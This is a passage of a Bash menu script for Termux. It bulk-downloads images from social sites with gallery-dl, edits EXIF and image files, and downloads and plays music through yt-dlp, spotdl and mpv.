                printf "  ${C1}[*] Instagram Bulk — paste usernames (one per line, Ctrl+D when done):${RESET}\n\n"
                local ig_users=()
                while IFS= read -r uname; do
                    [[ -z "$uname" ]] && continue
                    ig_users+=("$uname")
                done 2>/dev/null
                [[ ${#ig_users[@]} -eq 0 ]] && { printf "  ${RED}No usernames entered${RESET}\n"; sleep 1; continue; }
                echo ""
                for uname in "${ig_users[@]}"; do
                    printf "  ${C1}[→] Ripping @%s → %s/instagram/%s${RESET}\n" "$uname" "$GALDIR" "$uname"
                    mkdir -p "$GALDIR/instagram/$uname"
                    gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/instagram/$uname" "https://www.instagram.com/$uname/" 2>&1 | tail -3
                    printf "  ${GRN}✓ Done: @%s${RESET}\n\n" "$uname"
                done 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            13)
                echo ""
                printf "  ${C1}[*] Pinterest Bulk — paste board/pin URLs (one per line, Ctrl+D):${RESET}\n\n"
                local pin_urls=()
                while IFS= read -r purl; do
                    [[ -z "$purl" ]] && continue
                    pin_urls+=("$purl")
                done 2>/dev/null
                [[ ${#pin_urls[@]} -eq 0 ]] && { printf "  ${RED}No URLs entered${RESET}\n"; sleep 1; continue; }
                echo ""
                for purl in "${pin_urls[@]}"; do
                    local board_name; board_name=$(echo "$purl" | grep -oP 'pinterest\.com/[^/]+/\K[^/]+' | head -1)
                    [[ -z "$board_name" ]] && board_name="pinterest_$(date +%s)"
                    printf "  ${C1}[→] Board: %s${RESET}\n" "$board_name"
                    mkdir -p "$GALDIR/pinterest/$board_name"
                    gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/pinterest/$board_name" "$purl" 2>&1 | tail -3
                    printf "  ${GRN}✓ Done: %s${RESET}\n\n" "$board_name"
                done 2>/dev/null
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            14)
                echo ""
                printf "  ${C1}[*] Auto-Organizing vault by source domain...${RESET}\n\n"
                local moved=0
                while IFS= read -r -d '' f; do
                    local fname; fname=$(basename "$f")
                    local src=""
                    [[ "$fname" == *instagram* || "$fname" == *ig_* ]] && src="instagram"
                    [[ "$fname" == *twitter* || "$fname" == *tweet* ]] && src="twitter"
                    [[ "$fname" == *pinterest* || "$fname" == *pin_* ]] && src="pinterest"
                    [[ "$fname" == *reddit* || "$fname" == *r_* ]] && src="reddit"
                    [[ "$fname" == *tumblr* ]] && src="tumblr"
                    [[ -n "$src" ]] && mkdir -p "$GALDIR/$src" && mv "$f" "$GALDIR/$src/" && ((moved++)) && printf "  ${GRN}→${RESET} %s → %s\n" "$fname" "$src"
                done < <(find "$GALDIR" -maxdepth 1 -type f -print0 2>/dev/null)
                printf "\n  ${GRN}✓ Organized %s file(s)${RESET}\n" "$moved"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            15)
                echo ""; printf "  ${WH}Flickr URL or username: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                [[ "$url" != http* ]] && url="https://www.flickr.com/photos/$url"
                echo ""
                printf "  ${C1}[*] Pulling Flickr gallery...${RESET}\n\n"
                gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/flickr" "$url" \
                    && printf "  ${GRN}✓ Done — check $GALDIR/flickr${RESET}\n" \
                    || printf "  ${RED}Failed — check gallery-dl install${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            16)
                echo ""; printf "  ${WH}DeviantArt URL or username: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                [[ "$url" != http* ]] && url="https://www.deviantart.com/$url"
                echo ""
                printf "  ${C1}[*] Pulling DeviantArt gallery...${RESET}\n\n"
                gallery-dl --cookies "$COOKIES_FILE" -d "$GALDIR/deviantart" "$url" \
                    && printf "  ${GRN}✓ Done — check $GALDIR/deviantart${RESET}\n" \
                    || printf "  ${RED}Failed — check gallery-dl install${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            17)
                clear; echo ""
                _dv1
                printf "  ${C1}${BOLD}EXIF VIEWER${RESET}\n"
                _dv1; echo ""
                local -a _gimgs=()
                mapfile -t _gimgs < <(find "$GALDIR" -maxdepth 3 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.webp" -o -iname "*.gif" \) 2>/dev/null | sort)
                if [[ ${#_gimgs[@]} -eq 0 ]]; then
                    printf "  ${FADE}No images found in gallery vault${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                for _gi in "${!_gimgs[@]}"; do
                    printf "  ${C1}%3d.${RESET}  ${WH}%s${RESET}\n" "$((_gi+1))" "$(basename "${_gimgs[$_gi]}")"
                done
                echo ""; printf "  ${WH}Pick number: ${RESET}"; read -r _gnum
                [[ ! "$_gnum" =~ ^[0-9]+$ ]] && continue
                local _gfile="${_gimgs[$((_gnum-1))]}"
                [[ ! -f "$_gfile" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C1}[*] EXIF for: %s${RESET}\n\n" "$(basename "$_gfile")"
                if command -v exiftool &>/dev/null; then
                    exiftool "$_gfile" 2>/dev/null | sed 's/^/  /' | less -R
                elif command -v identify &>/dev/null; then
                    identify -verbose "$_gfile" 2>/dev/null | sed 's/^/  /' | less -R
                elif command -v ffprobe &>/dev/null; then
                    ffprobe -v quiet -show_format -show_streams "$_gfile" 2>/dev/null | sed 's/^/  /' | less -R
                else
                    printf "  ${RED}No EXIF tool — [Z] to install exiftool${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            18)
                echo ""
                printf "  ${C1}[*] Stripping EXIF from all images in vault...${RESET}\n\n"
                if command -v exiftool &>/dev/null; then
                    local _scount=0
                    while IFS= read -r _sf; do
                        exiftool -all= -overwrite_original "$_sf" 2>/dev/null && ((_scount++))
                        printf "  ${GRN}✓${RESET} %s\n" "$(basename "$_sf")"
                    done < <(find "$GALDIR" -maxdepth 3 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" \) 2>/dev/null)
                    printf "\n  ${GRN}✓ Stripped %d file(s)${RESET}\n" "$_scount"
                else
                    printf "  ${RED}exiftool not found — [Z] to install${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            19)
                clear; echo ""
                _dv1
                printf "  ${C1}${BOLD}VIDEO TO GIF${RESET}\n"
                _dv1; echo ""
                echo ""; printf "  ${WH}Video file path (or drag): ${RESET}"; read -r _vpath
                [[ ! -f "$_vpath" ]] && { printf "  ${RED}File not found${RESET}\n"; sleep 1; continue; }
                printf "  ${WH}Start time (e.g. 00:00:05): ${RESET}"; read -r _vstart
                printf "  ${WH}Duration in seconds (e.g. 5): ${RESET}"; read -r _vdur
                printf "  ${WH}Width in pixels (e.g. 480): ${RESET}"; read -r _vwidth
                [[ -z "$_vstart" ]] && _vstart="00:00:00"
                [[ -z "$_vdur"   ]] && _vdur="5"
                [[ -z "$_vwidth" ]] && _vwidth="480"
                local _gifout="$GALDIR/$(basename "${_vpath%.*}")_$(date +%H%M%S).gif"
                local _palette="${TMPDIR:-/tmp}/fezzy_pal_$$.png"
                echo ""
                printf "  ${C1}[*] Generating palette...${RESET}\n"
                ffmpeg -ss "$_vstart" -t "$_vdur" -i "$_vpath"                     -vf "fps=12,scale=${_vwidth}:-1:flags=lanczos,palettegen"                     -y "$_palette" 2>/dev/null
                printf "  ${C1}[*] Rendering GIF...${RESET}\n"
                ffmpeg -ss "$_vstart" -t "$_vdur" -i "$_vpath" -i "$_palette"                     -lavfi "fps=12,scale=${_vwidth}:-1:flags=lanczos[x];[x][1:v]paletteuse"                     -y "$_gifout" 2>/dev/null
                rm -f "$_palette"
                [[ -f "$_gifout" ]] && printf "  ${GRN}✓ Saved: %s${RESET}\n" "$_gifout"                                     || printf "  ${RED}✗ Failed — check ffmpeg install${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            20)
                clear; echo ""
                _dv1
                printf "  ${C1}${BOLD}MASS RESIZE${RESET}\n"
                _dv1; echo ""
                printf "  ${WH}Target width in pixels (e.g. 1280): ${RESET}"; read -r _rwidth
                [[ -z "$_rwidth" || ! "$_rwidth" =~ ^[0-9]+$ ]] && { printf "  ${RED}Invalid width${RESET}\n"; sleep 1; continue; }
                local _rout="$GALDIR/resized_${_rwidth}px"
                mkdir -p "$_rout"
                echo ""
                printf "  ${C1}[*] Resizing all JPG/PNG in vault to %spx width...${RESET}\n\n" "$_rwidth"
                if command -v convert &>/dev/null; then
                    local _rc=0
                    while IFS= read -r _rf; do
                        local _rname; _rname=$(basename "$_rf")
                        convert "$_rf" -resize "${_rwidth}x>" "$_rout/$_rname" 2>/dev/null                             && { printf "  ${GRN}✓${RESET} %s\n" "$_rname"; ((_rc++)); }                             || printf "  ${RED}✗${RESET} %s\n" "$_rname"
                    done < <(find "$GALDIR" -maxdepth 2 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" \) 2>/dev/null)
                    printf "\n  ${GRN}✓ Resized %d file(s) → %s${RESET}\n" "$_rc" "$_rout"
                else
                    printf "  ${RED}ImageMagick not found — [Z] to install${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            21)
                clear; echo ""
                _dv1
                printf "  ${C1}${BOLD}VIEW IN ANDROID${RESET}\n"
                _dv1; echo ""
                local -a _aImgs=()
                mapfile -t _aImgs < <(find "$GALDIR" -maxdepth 3 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.webp" -o -iname "*.gif" \) 2>/dev/null | sort)
                if [[ ${#_aImgs[@]} -eq 0 ]]; then
                    printf "  ${FADE}No images in vault${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                for _ai in "${!_aImgs[@]}"; do
                    printf "  ${C1}%3d.${RESET}  ${WH}%s${RESET}\n" "$((_ai+1))" "$(basename "${_aImgs[$_ai]}")"
                done
                echo ""; printf "  ${WH}Pick number to open: ${RESET}"; read -r _anum
                [[ ! "$_anum" =~ ^[0-9]+$ ]] && continue
                local _afile="${_aImgs[$((_anum-1))]}"
                [[ ! -f "$_afile" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                printf "  ${C1}[*] Opening in Android...${RESET}\n"
                termux-open "$_afile" 2>/dev/null                     || am start -a android.intent.action.VIEW -d "file://$_afile" -t "image/*" 2>/dev/null                     || printf "  ${RED}Could not open — termux-tools may be needed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            22)
                clear; echo ""
                _dv1
                printf "  ${C1}${BOLD}QUICK IMAGE BROWSE  ·  Gallery Vault${RESET}\n"
                _dv1; echo ""
                local -a _qImgs=()
                mapfile -t _qImgs < <(find "$GALDIR" -maxdepth 3 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.webp" -o -iname "*.gif" \) 2>/dev/null | sort)
                if [[ ${#_qImgs[@]} -eq 0 ]]; then
                    printf "  ${FADE}No images found in vault${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                local _qpage=0 _qper=20
                while true; do
                    clear; echo ""
                    _dv1
                    printf "  ${C1}${BOLD}BROWSE IMAGES  ·  %d total${RESET}\n" "${#_qImgs[@]}"
                    _dv1; echo ""
                    local _qs=$(( _qpage * _qper ))
                    local _qe=$(( _qs + _qper ))
                    (( _qe > ${#_qImgs[@]} )) && _qe=${#_qImgs[@]}
                    for (( _qi=_qs; _qi<_qe; _qi++ )); do
                        local _qsz; _qsz=$(du -sh "${_qImgs[$_qi]}" 2>/dev/null | cut -f1)
                        printf "  ${C1}%3d.${RESET}  ${WH}%-40s${RESET}  ${FADE}%s${RESET}\n"                             "$((_qi+1))" "$(basename "${_qImgs[$_qi]}")" "$_qsz"
                    done
                    echo ""; _dv1
                    local _qpages=$(( (${#_qImgs[@]} + _qper - 1) / _qper ))
                    printf "  ${FADE}Page %d/%d  ·  [N] Next  [P] Prev  [B] Back  or pick number to open${RESET}\n"                         "$((_qpage+1))" "$_qpages"
                    echo ""; printf "  ${C1}Choice » ${RESET}"; read -r _qc
                    case "$_qc" in
                        N|n) (( _qpage < _qpages-1 )) && (( _qpage++ )) ;;
                        P|p) (( _qpage > 0 )) && (( _qpage-- )) ;;
                        B|b) break ;;
                        *)
                            if [[ "$_qc" =~ ^[0-9]+$ ]] && (( _qc >= 1 && _qc <= ${#_qImgs[@]} )); then
                                local _qfile="${_qImgs[$((_qc-1))]}"
                                printf "  ${C1}[*] Opening in Android...${RESET}\n"
                                termux-open "$_qfile" 2>/dev/null                                     || am start -a android.intent.action.VIEW -d "file://$_qfile" -t "image/*" 2>/dev/null                                     || printf "  ${RED}termux-open not available${RESET}\n"
                                printf "  ${FADE}Press ENTER...${RESET}"; read -r
                            fi ;;
                    esac
                done
                ;;
            z|Z)
                echo ""
                printf "  ${C1}[INSTALL]${RESET} ${WH}Gallery portal packages${RESET}\n\n"
                pkg install gallery-dl yt-dlp libexif imagemagick ffmpeg -y
                pip install gallery-dl --break-system-packages 2>/dev/null
                pkg install perl 2>/dev/null && cpan Image::ExifTool 2>/dev/null
                printf "  ${GRN}✓ gallery-dl, yt-dlp, libexif, imagemagick, ffmpeg installed${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                clear; echo ""
                _dv
                printf "  ${C10}${BOLD}OPEN PDF IN ANDROID${RESET}\n"
                _dv; echo ""
                local -a _bpdfs=()
                mapfile -t _bpdfs < <(find ~/storage/downloads/books -name "*.pdf" -type f 2>/dev/null | sort)
                if [[ ${#_bpdfs[@]} -eq 0 ]]; then
                    printf "  ${FADE}No PDF files found in books folder${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                for _bi in "${!_bpdfs[@]}"; do
                    local _bsz; _bsz=$(du -sh "${_bpdfs[$_bi]}" 2>/dev/null | cut -f1)
                    printf "  ${C10}%2d.${RESET}  ${WH}%-40s${RESET}  ${FADE}%s${RESET}\n"                         "$((_bi+1))" "$(basename "${_bpdfs[$_bi]}")" "$_bsz"
                done
                echo ""; printf "  ${WH}Pick number: ${RESET}"; read -r _bpn
                [[ ! "$_bpn" =~ ^[0-9]+$ ]] && continue
                local _bpfile="${_bpdfs[$((_bpn-1))]}"
                [[ ! -f "$_bpfile" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                printf "  ${C10}[*] Opening: %s${RESET}\n" "$(basename "$_bpfile")"
                termux-open "$_bpfile" 2>/dev/null                     || am start -a android.intent.action.VIEW -d "file://$_bpfile" -t "application/pdf" 2>/dev/null                     || printf "  ${RED}Could not open — try pkg install termux-tools${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                clear; echo ""
                _dv
                printf "  ${C10}${BOLD}BROWSE & OPEN BOOKS${RESET}\n"
                _dv; echo ""
                local -a _ballbooks=()
                mapfile -t _ballbooks < <(find ~/storage/downloads/books -type f \( -iname "*.pdf" -o -iname "*.epub" -o -iname "*.mobi" -o -iname "*.txt" \) 2>/dev/null | sort)
                if [[ ${#_ballbooks[@]} -eq 0 ]]; then
                    printf "  ${FADE}No books found${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                local _bbpage=0 _bbper=20
                while true; do
                    clear; echo ""
                    _dv
                    printf "  ${C10}${BOLD}BOOKS VAULT  ·  %d total${RESET}\n" "${#_ballbooks[@]}"
                    _dv; echo ""
                    local _bbs=$(( _bbpage * _bbper ))
                    local _bbe=$(( _bbs + _bbper ))
                    (( _bbe > ${#_ballbooks[@]} )) && _bbe=${#_ballbooks[@]}
                    for (( _bbi=_bbs; _bbi<_bbe; _bbi++ )); do
                        local _bbext="${_ballbooks[$_bbi]##*.}"
                        local _bbsz; _bbsz=$(du -sh "${_ballbooks[$_bbi]}" 2>/dev/null | cut -f1)
                        printf "  ${C10}%3d.${RESET}  ${WH}%-38s${RESET}  ${FADE}%s  %s${RESET}\n"                             "$((_bbi+1))" "$(basename "${_ballbooks[$_bbi]}")" "$_bbext" "$_bbsz"
                    done
                    echo ""; _dv
                    local _bbpages=$(( (${#_ballbooks[@]} + _bbper - 1) / _bbper ))
                    printf "  ${FADE}Page %d/%d  ·  [N] Next  [P] Prev  [B] Back  or pick number to open${RESET}\n"                         "$((_bbpage+1))" "$_bbpages"
                    echo ""; printf "  ${C10}Choice » ${RESET}"; read -r _bbc
                    case "$_bbc" in
                        N|n) (( _bbpage < _bbpages-1 )) && (( _bbpage++ )) ;;
                        P|p) (( _bbpage > 0 )) && (( _bbpage-- )) ;;
                        B|b) break ;;
                        *)
                            if [[ "$_bbc" =~ ^[0-9]+$ ]] && (( _bbc >= 1 && _bbc <= ${#_ballbooks[@]} )); then
                                local _bbfile="${_ballbooks[$((_bbc-1))]}"
                                local _bbtype; _bbtype=$(file -b --mime-type "$_bbfile" 2>/dev/null || echo "application/octet-stream")
                                printf "  ${C10}[*] Opening: %s${RESET}\n" "$(basename "$_bbfile")"
                                termux-open "$_bbfile" 2>/dev/null                                     || am start -a android.intent.action.VIEW -d "file://$_bbfile" -t "$_bbtype" 2>/dev/null                                     || printf "  ${RED}termux-open not available${RESET}\n"
                                printf "  ${FADE}Press ENTER...${RESET}"; read -r
                            fi ;;
                    esac
                done
                ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [2] MUSIC PORTAL
# ═══════════════════════════════════════════════════════════════════

music_portal() {
    while true; do
        clear
        _portal_entry "Music Portal" "${C2}"
        echo ""
        _dv2
        printf "  ${C2}${BOLD}MUSIC PORTAL  —  MP3 · Playlist · SoundCloud · Bandcamp  ${RESET}\n"
        _dv2
        echo ""
        printf "  ${WH}yt-dlp · ffmpeg · mpv · MP3 · ~/storage/downloads${RESET}\n"
        printf "  ${FADE}■ Plug came through with the frequency · MP3 sealed · artwork embedded · bag clean every time${RESET}\n"
        echo ""
        _dv2
        echo ""
        printf "  ${WH}[1] Paste URL — best quality MP3, auto extracted                    ${RESET}\n"
        printf "  ${WH}[2] Playlist — every track pulled, numbered and tagged               ${RESET}\n"
        printf "  ${WH}[3] Custom format — see all formats, pick one                        ${RESET}\n"
        printf "  ${WH}[4] Artwork only — cover art image, no audio                         ${RESET}\n"
        printf "  ${WH}[5] SoundCloud — SC link to MP3 direct                               ${RESET}\n"
        printf "  ${WH}[6] Bandcamp — track or full album                                   ${RESET}\n"
        printf "  ${WH}[7] Play local MP3 — browse downloads and play with mpv              ${RESET}\n"
        printf "  ${WH}[8] Search YouTube Music — find and download MP3s from YouTube       ${RESET}\n"
        printf "  ${WH}[9] Bulk MP3 list — multiple URLs, one operation                     ${RESET}\n"
        printf "  ${C2}[10] YouTube DL-GUI — URL or search term, MP3 to music folder       ${RESET}\n"
        printf "  ${C2}[11] AudioMack — paste AudioMack track or playlist URL              ${RESET}\n"
        printf "  ${C2}[12] spotdl — Spotify URL to MP3 via spotdl (install required)     ${RESET}\n"
        printf "  ${C2}[13] Lyrics search download — type song name · pick · download      ${RESET}\n"
        printf "  ${C2}[14] Bitrate checker — check audio quality of downloaded files      ${RESET}\n"
        printf "  ${C2}[15] Convert format — ffmpeg audio converter (mp3/flac/ogg/m4a)    ${RESET}\n"
        printf "  ${C2}[16] Search & Queue — search · pick · choose format · queue · dl   ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu  ·  [Z] Install music packages${RESET}\n"
        echo ""
        _dv2
        echo ""
        _hover_hint "music"
        echo ""
        printf "  ${C2}${BOLD}Choice » ${RESET}"
        read -r ch
        
        case "$ch" in
            1)
                echo ""; printf "  ${WH}Paste URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C2}[*] Downloading MP3 (best quality)...${RESET}\n\n"
                yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done — check $DLDIR${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}Playlist URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C2}[*] Downloading playlist (all tracks)...${RESET}\n\n"
                yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Playlist complete${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""; printf "  ${WH}Paste URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C2}[*] Listing available formats...${RESET}\n\n"
                yt-dlp -F "$url"
                echo ""
                printf "  ${WH}Format ID to download: ${RESET}"; read -r fmt
                [[ -z "$fmt" ]] && continue
                echo ""
                printf "  ${C2}[*] Downloading format %s...${RESET}\n\n" "$fmt"
                yt-dlp -f "$fmt" -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""; printf "  ${WH}Paste URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C2}[*] Downloading artwork only...${RESET}\n\n"
                yt-dlp --write-thumbnail --skip-download -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Artwork saved${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""; printf "  ${WH}SoundCloud URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C2}[*] SoundCloud to MP3...${RESET}\n\n"
                yt-dlp -x --audio-format mp3 --embed-thumbnail -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""; printf "  ${WH}Bandcamp URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C2}[*] Bandcamp download...${RESET}\n\n"
                yt-dlp -x --audio-format mp3 --embed-thumbnail -o "$DLDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""
                printf "  ${C2}[*] MP3 files in downloads:${RESET}\n\n"
                ls -1 "$DLDIR"/*.mp3 2>/dev/null | head -20 | nl -w2 -s". "
                echo ""
                printf "  ${WH}Number to play (or path): ${RESET}"; read -r selection
                [[ -z "$selection" ]] && continue
                
                if [[ "$selection" =~ ^[0-9]+$ ]]; then
                    file=$(ls -1 "$DLDIR"/*.mp3 2>/dev/null | sed -n "${selection}p")
                else
                    file="$selection"
                fi
                
                [[ ! -f "$file" ]] && { printf "  ${RED}File not found${RESET}\n"; sleep 1; continue; }
                
                echo ""
                printf "  ${C2}[*] Playing: %s${RESET}\n\n" "$(basename "$file")"
                mpv --no-video "$file"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""; printf "  ${WH}Search query: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C2}[*] Searching YouTube Music + SoundCloud...${RESET}\n\n"
                yt-dlp "ytsearch10:$query" -x --audio-format mp3 --embed-thumbnail --add-metadata --print "%(title)s - %(uploader)s [%(duration_string)s]" --skip-download | nl -w2 -s". "
                echo ""
                printf "  ${WH}Download result number (1-10) or 0 for all: ${RESET}"; read -r num
                [[ -z "$num" ]] && continue
                
                if [[ "$num" == "0" ]]; then
                    echo ""
                    printf "  ${C2}[*] Downloading all 10 results...${RESET}\n\n"
                    yt-dlp "ytsearch10:$query" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s"
                else
                    echo ""
                    printf "  ${C2}[*] Downloading result #%s...${RESET}\n\n" "$num"
                    yt-dlp "ytsearch10:$query" -x --audio-format mp3 --embed-thumbnail --add-metadata --playlist-items "$num" -o "$DLDIR/%(title)s.%(ext)s"
                fi
                echo ""; printf "  ${GRN}✓ Done — check $DLDIR${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""; printf "  ${WH}Paste URLs (one per line, Ctrl+D when done):${RESET}\n"
                while IFS= read -r url; do
                    [[ -z "$url" ]] && continue
                    printf "  ${C2}→${RESET} %s\n" "$url"
                    yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$DLDIR/%(title)s.%(ext)s" "$url"
                done 2>/dev/null
                echo ""; printf "  ${GRN}✓ All downloads complete${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""; printf "  ${WH}URL or search term: ${RESET}"; read -r ytq
                [[ -z "$ytq" ]] && continue
                mkdir -p "$MUSICDIR"
                if [[ -d ~/Termux-YT-DLG ]]; then
                    echo ""
                    printf "  ${C2}[*] Termux-YT-DLG download...${RESET}\n\n"
                    if [[ "$ytq" =~ ^https?:// ]]; then
                        yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$MUSICDIR/%(title)s.%(ext)s" "$ytq"
                    else
                        yt-dlp "ytsearch5:$ytq" -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$MUSICDIR/%(title)s.%(ext)s" --playlist-items 1
                    fi
                    printf "  ${GRN}✓ Saved to %s${RESET}\n" "$MUSICDIR"
                else
                    printf "  ${YEL}Termux-YT-DLG not cloned yet.${RESET}\n"
                    printf "  ${WH}Install now? [y/n]: ${RESET}"; read -r ytins
                    if [[ "$ytins" == "y" || "$ytins" == "Y" ]]; then
                        git clone https://github.com/Rims-Naps/Termux-YT-DLG.git ~/Termux-YT-DLG
                        pkg install yt-dlp ffmpeg -y
                        printf "  ${GRN}✓ Installed. Re-run option [10] to download.${RESET}\n"
                    fi
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""; printf "  ${WH}AudioMack URL (track or playlist): ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C2}[*] Downloading from AudioMack...${RESET}\n\n"
                yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata -o "$MUSICDIR/%(title)s.%(ext)s" "$url"
                echo ""; printf "  ${GRN}✓ Done — check $MUSICDIR${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                echo ""
                if ! command -v spotdl &>/dev/null; then
                    printf "  ${YEL}spotdl not installed.${RESET}\n"
                    printf "  ${WH}Install now? [y/n]: ${RESET}"; read -r sins
                    if [[ "$sins" == "y" || "$sins" == "Y" ]]; then
                        pip install spotdl --break-system-packages 2>/dev/null || pip install spotdl
                        printf "  ${GRN}✓ spotdl installed${RESET}\n"
                    fi
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                printf "  ${WH}Spotify URL (track/album/playlist): ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C2}[*] spotdl downloading...${RESET}\n\n"
                spotdl download "$url" --output "$MUSICDIR/{title}.{output-ext}" 2>/dev/null \
                    || spotdl "$url" --output "$MUSICDIR"
                echo ""; printf "  ${GRN}✓ Done — check $MUSICDIR${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            13)
                echo ""; printf "  ${WH}Song name + artist: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C2}[*] Searching YouTube Music for '%s'...${RESET}\n\n" "$query"
                yt-dlp "ytsearch5:$query" --print "%(title)s — %(uploader)s [%(duration_string)s]" --skip-download | nl -w2 -s". "
                echo ""
                printf "  ${WH}Pick number to download (1-5): ${RESET}"; read -r num
                [[ -z "$num" ]] && continue
                echo ""
                printf "  ${C2}[*] Downloading #%s...${RESET}\n\n" "$num"
                yt-dlp "ytsearch5:$query" -x --audio-format mp3 --embed-thumbnail --add-metadata --playlist-items "$num" -o "$MUSICDIR/%(title)s.%(ext)s"
                echo ""; printf "  ${GRN}✓ Saved to $MUSICDIR${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            14)
                echo ""
                printf "  ${C2}[*] Scanning audio files in $MUSICDIR...${RESET}\n\n"
                mapfile -t afiles < <(find "$MUSICDIR" -type f \( -name "*.mp3" -o -name "*.flac" -o -name "*.ogg" -o -name "*.m4a" \) 2>/dev/null | sort)
                if [[ ${#afiles[@]} -eq 0 ]]; then
                    printf "  ${FADE}No audio files found${RESET}\n"; sleep 1; continue
                fi
                for i in "${!afiles[@]}"; do
                    local af="${afiles[$i]}"
                    local br; br=$(ffprobe -v quiet -show_entries format=bit_rate -of csv=p=0 "$af" 2>/dev/null | awk '{printf "%.0f kbps", $1/1000}')
                    local afmt; afmt=$(ffprobe -v quiet -show_entries format=format_name -of csv=p=0 "$af" 2>/dev/null)
